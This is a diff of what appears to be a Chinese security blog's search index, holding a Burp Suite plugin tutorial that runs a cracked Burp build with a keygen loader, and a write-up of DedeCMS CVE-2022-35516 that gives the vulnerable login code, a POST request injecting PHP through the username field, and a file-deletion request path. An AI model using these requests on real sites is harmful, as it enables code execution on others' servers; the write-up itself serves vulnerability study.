@@ -37,11 +37,76 @@
 <li>hexo-generator-searchdb</li>
 </ul>
 ]]></content>
+  </entry>
+  <entry>
+    <title>BurpSuit 插件开发（一）</title>
+    <url>/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><ol>
+<li>burp官方支持三种语言开发插件：Java、Python、Ruby。但一般情况下推荐使用Java来做插件开发。原因有以下两点：<ol>
+<li>当用python去做插件的时候，如果需要使用到某个库，而这个库又是用C语言实现的。那么插件将无法正常运行。因为burp在执行python写的插件的时候，是通过Jython（Jython是一种完整的语言，而不是一个Java翻译器或仅仅是一个Python编译器，它是一个Python语言在Java中的完全实现。）去解析执行的。而Jython是无法使用C写的模块，所以在这时候插件就不能正常运行。</li>
+<li>burp本身是Java写的，使用Java去开发插件兼容性最高，会少很多莫名其妙的错误。而且当使用Java的时候，可以很方便的和ide进行远程调试。而在使用python写插件进行调试时，只能尽量通过输出去获取信息，没有好的办法进行下断点的动态调试</li>
+</ol>
+</li>
+</ol>
+<p>  所以说Java是写插件的最优选择</p>
+<ol start="2">
+<li>回调的概念<br>我们所写的插件，都是被burp所调用的，实质上就是个回调<img src="/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/1.png" class=""></li>
+</ol>
+<h2 id="二、入门准备"><a href="#二、入门准备" class="headerlink" title="二、入门准备"></a>二、入门准备</h2><ol>
+<li>在本文中是使用java来进行开发，所以主要讲一下java中的调试方法。其他语言就多写点print就可以了。</li>
+<li>由于国内大多数是用的破解版burp，所以在调试方法的准备上稍微需要一点改变。一般情况下破解版burp有使用helper的，有使用keygen的。而如果想要进入调试状态，则需要使用kygen。在我的调试环境下，有如下两个文件<ol>
+<li><strong>burp-loader-keygen.jar</strong></li>
+<li><strong>burpsuite_pro_v1.7.31.jar</strong></li>
+</ol>
+</li>
+</ol>
+<p>  用如下命令启动burp并让它处于调试的监听方：<code>java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 -Xbootclasspath/p:burp-loader-keygen.jar -jar burpsuite_pro_v1.7.31.jar</code>这个命令和调试正版burp的区别在于，这个命令需要加<code>-Xbootclasspath/p:burp-loader-keygen.jar</code>这一段。<br>  可以将这条指令保存为bat文件，方便一键启动。<br>3. 另一边就是IDE的配置了，以idea为例（注意jdk环境不能太高，否则你打包的jar包burp不能正常加载，推荐使用jdk1.8）</p>
+<img src="/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/2.png" class="">
+<p>如上debug模式的burp和IDEA都配置好后，就可以进行下断点调试了。需要注意的是，需要保持IDEA中的代码和你打包的插件的代码一致。</p>
+<ol start="4">
+<li>顺便在这里再码一篇写的很棒的文章 <a href="https://blog.netspi.com/debugging-burp-extensions/">https://blog.netspi.com/debugging-burp-extensions/</a><br>还有，官方资料都是最好的资料 <a href="https://portswigger.net/burp/extender#SampleExtensions">https://portswigger.net/burp/extender#SampleExtensions</a></li>
+</ol>
+<h2 id="三、Hello-World"><a href="#三、Hello-World" class="headerlink" title="三、Hello World"></a>三、Hello World</h2><ol>
+<li>首先我们创建一个IDEA工程文件，并且创建一个名叫burp的包。然后启动之前准备好的bat文件。并将burp里面的API接口文件导出到IDEA的burp包里面。再之后，新建一个class文件，名字为BurpExtender。然后写入以下代码。<img src="/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/3.png" class="">
+<img src="/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/4.png" class=""></li>
+</ol>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> burp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BurpExtender</span> <span class="keyword">implements</span> <span class="title class_">IBurpExtender</span>&#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// implements IBurpExtender</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">registerExtenderCallbacks</span><span class="params">(IBurpExtenderCallbacks callbacks)</span> &#123;</span><br><span class="line">        <span class="comment">// set our extension name</span></span><br><span class="line">        callbacks.setExtensionName(<span class="string">&quot;Hello world extension&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// obtain our output and error streams</span></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">stdout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(callbacks.getStdout(), <span class="literal">true</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">stderr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(callbacks.getStderr(), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write a message to our output stream</span></span><br><span class="line">        stdout.println(<span class="string">&quot;This is output&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write a message to our error stream</span></span><br><span class="line">        stderr.println(<span class="string">&quot;This is errors&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write a message to the Burp alerts tab</span></span><br><span class="line">        callbacks.issueAlert(<span class="string">&quot;Hello alerts&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// throw an exception that will appear in our error stream</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Hello exception&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>将项目打包为jar包然后从burp导入jar包</p>
+<img src="/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/5.png" class="">
+<img src="/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/6.png" class="">
+<img src="/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/7.png" class="">
+<img src="/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/8.png" class="">
+<img src="/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/9.png" class="">
+<img src="/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/10.png" class="">
+
+<p>最后成功输出结果</p>
+<img src="/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/11.png" class="">
+]]></content>
+  </entry>
+  <entry>
+    <title>DedeCMS前台代码执行(CVE-2022-35516)</title>
+    <url>/2023/09/26/DedeCMS%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2022-35516/</url>
+    <content><![CDATA[<p>影响版本: DedeCMS v5.7.93 - v5.7.96<br>漏洞产生原因: 在后台登录功能处，没有对用户名进行过滤，导致用户可以从用户名处注入恶意代码。<br>漏洞代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// /dede/login.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span> = DEDEDATA.<span class="string">&#x27;/login.data.php&#x27;</span>;</span><br><span class="line"><span class="comment">// 连续登录失败用户锁定  </span></span><br><span class="line"><span class="variable">$count</span> = <span class="number">1</span>;  </span><br><span class="line"><span class="variable">$timestamp</span> = <span class="title function_ invoke__">time</span>();  </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$arr_login</span>[<span class="variable">$userid</span>] != <span class="string">&#x27;&#x27;</span>) &#123;  </span><br><span class="line">    <span class="variable">$count</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$arr_login</span>[<span class="variable">$userid</span>])[<span class="number">0</span>] + <span class="number">1</span>;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$count</span> &gt; <span class="variable">$fail_limit</span>) &#123;  </span><br><span class="line">        <span class="variable">$count</span> = <span class="number">1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$arr_login</span>[<span class="variable">$userid</span>] = <span class="string">&quot;<span class="subst">&#123;$count&#125;</span>,<span class="subst">&#123;$timestamp&#125;</span>&quot;</span>;  </span><br><span class="line"><span class="variable">$content</span> = <span class="string">&quot;&lt;?php\r\n\$str_login=&#x27;&quot;</span>.<span class="title function_ invoke__">json_encode</span>(<span class="variable">$arr_login</span>).<span class="string">&quot;&#x27;;&quot;</span>;  </span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;写入文件 <span class="subst">$filename</span> 失败，请检查权限！&quot;</span>);  </span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$content</span>);  </span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br></pre></td></tr></table></figure>
+
+<p>就是完全没有对用户名进行过滤，还把用户名写到了 <code>login.data.php</code> 里面<br>直接构造代码注入即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /dede/login.php HTTP/1.1</span><br><span class="line">Host: dedecms5793</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: PHPSESSID=e9ag7oevkh77gnko3cdmt7mbc2</span><br><span class="line"></span><br><span class="line">dopost=login&amp;userid=\&#x27;.phpinfo();?&gt;&amp;pwd=123&amp;validate=hw0k</span><br></pre></td></tr></table></figure>
+
+<p>然后访问 <code>http://example.com/data/login.data.php</code> 就可以触发注入的代码了<br>思考：</p>
+<ol>
+<li>该漏洞如何修复的？<br>对用户名和密码进行了过滤，并且增添了一个登录失败的处理方式</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$res</span>==-<span class="number">1</span>)  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="title function_ invoke__">ResetVdValue</span>();  </span><br><span class="line">    <span class="title function_ invoke__">ShowMsg</span>(<span class="string">&#x27;用户名或者密码错误!&#x27;</span>,<span class="string">&#x27;login.php&#x27;</span>,<span class="number">0</span>,<span class="number">1000</span>);  </span><br><span class="line">    <span class="keyword">exit</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>还有其它类似的漏洞触发点吗？<br>没有找到。</li>
+</ol>
+]]></content>
       <categories>
-        <category>备份</category>
+        <category>DedeCMS</category>
       </categories>
       <tags>
-        <tag>环境搭建</tag>
+        <tag>RCE</tag>
       </tags>
   </entry>
   <entry>
@@ -92,91 +157,12 @@
 <p>首先, 使用任意文件删除漏洞删除 <code>password.data.php</code> 文件。<br><code>/uploads/dede/upload.php?dopost=delete&amp;delete=/Rebmal/../../password.data.php</code><br>然后再使用代码注入漏洞进行恶意代码写入。</p>
 <p>这样就实现了无限制的代码注入。</p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>BurpSuit 插件开发（一）</title>
-    <url>/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/</url>
-    <content><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><ol>
-<li>burp官方支持三种语言开发插件：Java、Python、Ruby。但一般情况下推荐使用Java来做插件开发。原因有以下两点：<ol>
-<li>当用python去做插件的时候，如果需要使用到某个库，而这个库又是用C语言实现的。那么插件将无法正常运行。因为burp在执行python写的插件的时候，是通过Jython（Jython是一种完整的语言，而不是一个Java翻译器或仅仅是一个Python编译器，它是一个Python语言在Java中的完全实现。）去解析执行的。而Jython是无法使用C写的模块，所以在这时候插件就不能正常运行。</li>
-<li>burp本身是Java写的，使用Java去开发插件兼容性最高，会少很多莫名其妙的错误。而且当使用Java的时候，可以很方便的和ide进行远程调试。而在使用python写插件进行调试时，只能尽量通过输出去获取信息，没有好的办法进行下断点的动态调试</li>
-</ol>
-</li>
-</ol>
-<p>  所以说Java是写插件的最优选择</p>
-<ol start="2">
-<li>回调的概念<br>我们所写的插件，都是被burp所调用的，实质上就是个回调<img src="/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/1.png" class=""></li>
-</ol>
-<h2 id="二、入门准备"><a href="#二、入门准备" class="headerlink" title="二、入门准备"></a>二、入门准备</h2><ol>
-<li>在本文中是使用java来进行开发，所以主要讲一下java中的调试方法。其他语言就多写点print就可以了。</li>
-<li>由于国内大多数是用的破解版burp，所以在调试方法的准备上稍微需要一点改变。一般情况下破解版burp有使用helper的，有使用keygen的。而如果想要进入调试状态，则需要使用kygen。在我的调试环境下，有如下两个文件<ol>
-<li><strong>burp-loader-keygen.jar</strong></li>
-<li><strong>burpsuite_pro_v1.7.31.jar</strong></li>
-</ol>
-</li>
-</ol>
-<p>  用如下命令启动burp并让它处于调试的监听方：<code>java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 -Xbootclasspath/p:burp-loader-keygen.jar -jar burpsuite_pro_v1.7.31.jar</code>这个命令和调试正版burp的区别在于，这个命令需要加<code>-Xbootclasspath/p:burp-loader-keygen.jar</code>这一段。<br>  可以将这条指令保存为bat文件，方便一键启动。<br>3. 另一边就是IDE的配置了，以idea为例（注意jdk环境不能太高，否则你打包的jar包burp不能正常加载，推荐使用jdk1.8）</p>
-<img src="/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/2.png" class="">
-<p>如上debug模式的burp和IDEA都配置好后，就可以进行下断点调试了。需要注意的是，需要保持IDEA中的代码和你打包的插件的代码一致。</p>
-<ol start="4">
-<li>顺便在这里再码一篇写的很棒的文章 <a href="https://blog.netspi.com/debugging-burp-extensions/">https://blog.netspi.com/debugging-burp-extensions/</a><br>还有，官方资料都是最好的资料 <a href="https://portswigger.net/burp/extender#SampleExtensions">https://portswigger.net/burp/extender#SampleExtensions</a></li>
-</ol>
-<h2 id="三、Hello-World"><a href="#三、Hello-World" class="headerlink" title="三、Hello World"></a>三、Hello World</h2><ol>
-<li>首先我们创建一个IDEA工程文件，并且创建一个名叫burp的包。然后启动之前准备好的bat文件。并将burp里面的API接口文件导出到IDEA的burp包里面。再之后，新建一个class文件，名字为BurpExtender。然后写入以下代码。<img src="/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/3.png" class="">
-<img src="/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/4.png" class=""></li>
-</ol>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> burp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BurpExtender</span> <span class="keyword">implements</span> <span class="title class_">IBurpExtender</span>&#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// implements IBurpExtender</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">registerExtenderCallbacks</span><span class="params">(IBurpExtenderCallbacks callbacks)</span> &#123;</span><br><span class="line">        <span class="comment">// set our extension name</span></span><br><span class="line">        callbacks.setExtensionName(<span class="string">&quot;Hello world extension&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// obtain our output and error streams</span></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">stdout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(callbacks.getStdout(), <span class="literal">true</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">stderr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(callbacks.getStderr(), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write a message to our output stream</span></span><br><span class="line">        stdout.println(<span class="string">&quot;This is output&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write a message to our error stream</span></span><br><span class="line">        stderr.println(<span class="string">&quot;This is errors&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write a message to the Burp alerts tab</span></span><br><span class="line">        callbacks.issueAlert(<span class="string">&quot;Hello alerts&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// throw an exception that will appear in our error stream</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Hello exception&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>将项目打包为jar包然后从burp导入jar包</p>
-<img src="/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/5.png" class="">
-<img src="/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/6.png" class="">
-<img src="/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/7.png" class="">
-<img src="/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/8.png" class="">
-<img src="/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/9.png" class="">
-<img src="/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/10.png" class="">
-
-<p>最后成功输出结果</p>
-<img src="/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/11.png" class="">
-]]></content>
       <categories>
-        <category>安全开发</category>
+        <category>DedeCMS</category>
       </categories>
       <tags>
-        <tag>Java</tag>
-        <tag>Burp</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DedeCMS前台代码执行(CVE-2022-35516)</title>
-    <url>/2023/09/26/DedeCMS%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2022-35516/</url>
-    <content><![CDATA[<p>影响版本: DedeCMS v5.7.93 - v5.7.96<br>漏洞产生原因: 在后台登录功能处，没有对用户名进行过滤，导致用户可以从用户名处注入恶意代码。<br>漏洞代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// /dede/login.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span> = DEDEDATA.<span class="string">&#x27;/login.data.php&#x27;</span>;</span><br><span class="line"><span class="comment">// 连续登录失败用户锁定  </span></span><br><span class="line"><span class="variable">$count</span> = <span class="number">1</span>;  </span><br><span class="line"><span class="variable">$timestamp</span> = <span class="title function_ invoke__">time</span>();  </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$arr_login</span>[<span class="variable">$userid</span>] != <span class="string">&#x27;&#x27;</span>) &#123;  </span><br><span class="line">    <span class="variable">$count</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$arr_login</span>[<span class="variable">$userid</span>])[<span class="number">0</span>] + <span class="number">1</span>;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$count</span> &gt; <span class="variable">$fail_limit</span>) &#123;  </span><br><span class="line">        <span class="variable">$count</span> = <span class="number">1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$arr_login</span>[<span class="variable">$userid</span>] = <span class="string">&quot;<span class="subst">&#123;$count&#125;</span>,<span class="subst">&#123;$timestamp&#125;</span>&quot;</span>;  </span><br><span class="line"><span class="variable">$content</span> = <span class="string">&quot;&lt;?php\r\n\$str_login=&#x27;&quot;</span>.<span class="title function_ invoke__">json_encode</span>(<span class="variable">$arr_login</span>).<span class="string">&quot;&#x27;;&quot;</span>;  </span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;写入文件 <span class="subst">$filename</span> 失败，请检查权限！&quot;</span>);  </span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$content</span>);  </span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br></pre></td></tr></table></figure>
-
-<p>就是完全没有对用户名进行过滤，还把用户名写到了 <code>login.data.php</code> 里面<br>直接构造代码注入即可</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /dede/login.php HTTP/1.1</span><br><span class="line">Host: dedecms5793</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: PHPSESSID=e9ag7oevkh77gnko3cdmt7mbc2</span><br><span class="line"></span><br><span class="line">dopost=login&amp;userid=\&#x27;.phpinfo();?&gt;&amp;pwd=123&amp;validate=hw0k</span><br></pre></td></tr></table></figure>
-
-<p>然后访问 <code>http://example.com/data/login.data.php</code> 就可以触发注入的代码了<br>思考：</p>
-<ol>
-<li>该漏洞如何修复的？<br>对用户名和密码进行了过滤，并且增添了一个登录失败的处理方式</li>
-</ol>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$res</span>==-<span class="number">1</span>)  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="title function_ invoke__">ResetVdValue</span>();  </span><br><span class="line">    <span class="title function_ invoke__">ShowMsg</span>(<span class="string">&#x27;用户名或者密码错误!&#x27;</span>,<span class="string">&#x27;login.php&#x27;</span>,<span class="number">0</span>,<span class="number">1000</span>);  </span><br><span class="line">    <span class="keyword">exit</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ol start="2">
-<li>还有其它类似的漏洞触发点吗？<br>没有找到。</li>
-</ol>
-]]></content>
-  </entry>
-  <entry>
-    <title>HTTP协议</title>
-    <url>/2021/08/24/HTTP%E5%8D%8F%E8%AE%AE/</url>
-    <content><![CDATA[<p>一些基础知识</p>
-<p>绕过CDN查找真实IP地址</p>
-]]></content>
-      <categories>
-        <category>协议相关</category>
-      </categories>
-      <tags>
-        <tag>HTTP</tag>
-        <tag>DNS</tag>
+        <tag>RCE</tag>
+        <tag>文件删除</tag>
       </tags>
   </entry>
   <entry>
@@ -215,13 +201,8 @@
 <p>说明：将文件描述符 n 重定向到 word 指代的文件（以只读方式打开），<strong>如果 n 省略就是0</strong>（标准输入）</p>
 <h2 id="什么是反弹shell"><a href="#什么是反弹shell" class="headerlink" title="什么是反弹shell"></a>什么是反弹shell</h2><h2 id="为什么要反弹shell"><a href="#为什么要反弹shell" class="headerlink" title="为什么要反弹shell"></a>为什么要反弹shell</h2><h2 id="反弹shell的本质是什么"><a href="#反弹shell的本质是什么" class="headerlink" title="反弹shell的本质是什么"></a>反弹shell的本质是什么</h2><h2 id="常见的反弹shell的语句"><a href="#常见的反弹shell的语句" class="headerlink" title="常见的反弹shell的语句"></a>常见的反弹shell的语句</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>]]></content>
       <categories>
-        <category>SHELL</category>
+        <category>渗透</category>
       </categories>
-      <tags>
-        <tag>Linux</tag>
-        <tag>反弹shell</tag>
-        <tag>原理分析</tag>
-      </tags>
   </entry>
   <entry>
     <title>SQL注入</title>
@@ -264,12 +245,8 @@
 <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">Payloads All The Things</a></li>
 </ul>
 ]]></content>
-      <categories>
-        <category>SQL注入</category>
-      </categories>
       <tags>
-        <tag>基础漏洞</tag>
-        <tag>基础</tag>
+        <tag>SQL注入</tag>
       </tags>
   </entry>
   <entry>
@@ -335,35 +312,7 @@
       </categories>
       <tags>
         <tag>RCE</tag>
-        <tag>PHP</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>Ubuntu22.04搭建LAMP环境</title>
-    <url>/2023/09/21/Ubuntu22-04%E6%90%AD%E5%BB%BALAMP%E7%8E%AF%E5%A2%83/</url>
-    <content><![CDATA[<blockquote>
-<p>LAMP 环境即 （Linux + Apache + Mysql + PHP）集成环境</p>
-</blockquote>
-<h1 id="1-更新源"><a href="#1-更新源" class="headerlink" title="1. 更新源"></a>1. 更新源</h1><p>首先更新 Ubuntu22.04 中的所有东西</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 备份</span></span><br><span class="line">sudo <span class="built_in">cp</span> /etc/apt/sources.list /etc/apt/sources.list.bak</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 换源</span></span><br><span class="line">sudo vim /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用vim修改配置内容如下（原有内容直接添加 #(井号) 进行注释）</span></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse </span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse </span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse </span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse </span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse </span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse </span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse </span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse </span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse </span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 更新源</span></span><br><span class="line">sudo apt-get update </span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 更新软件</span></span><br><span class="line">sudo apt-get upgrade</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 更新系统软件 </span></span><br><span class="line">sudo apt-get dist-upgrade</span><br></pre></td></tr></table></figure>
-
-<h1 id="2-安装Apache2"><a href="#2-安装Apache2" class="headerlink" title="2. 安装Apache2"></a>2. 安装Apache2</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 安装</span></span><br><span class="line">sudo apt install apache2 -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 检查 Apache2 是否开启</span></span><br><span class="line">systemctl status apache2</span><br></pre></td></tr></table></figure>
-
-<h1 id="3-安装MySQL"><a href="#3-安装MySQL" class="headerlink" title="3. 安装MySQL"></a>3. 安装MySQL</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 安装</span></span><br><span class="line">sudo apt install mysql-server mysql-client</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 查看MySQL是否安装成功</span></span><br><span class="line">sudo mysql</span><br></pre></td></tr></table></figure>
-
-<h1 id="4-安装PHP"><a href="#4-安装PHP" class="headerlink" title="4. 安装PHP"></a>4. 安装PHP</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 安装 PHP</span></span><br><span class="line">sudo apt-get install php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 查看PHP是否安装成功</span></span><br><span class="line">sudo php -v</span><br></pre></td></tr></table></figure>
-
